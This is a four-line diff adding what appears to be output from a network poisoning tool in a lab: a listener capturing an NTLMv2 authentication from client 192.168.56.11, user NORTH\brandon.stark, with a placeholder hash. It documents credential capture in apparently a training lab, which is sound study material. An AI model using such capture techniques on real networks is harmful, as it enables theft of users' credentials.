@@ -1,0 +1,4 @@
+[+] Listening for events...
+[SMB] NTLMv2-SSP Client   : 192.168.56.11
+[SMB] NTLMv2-SSP Username : NORTH\brandon.stark
+[SMB] NTLMv2-SSP Hash     : brandon.stark::NORTH:abc123:HASH_DATA
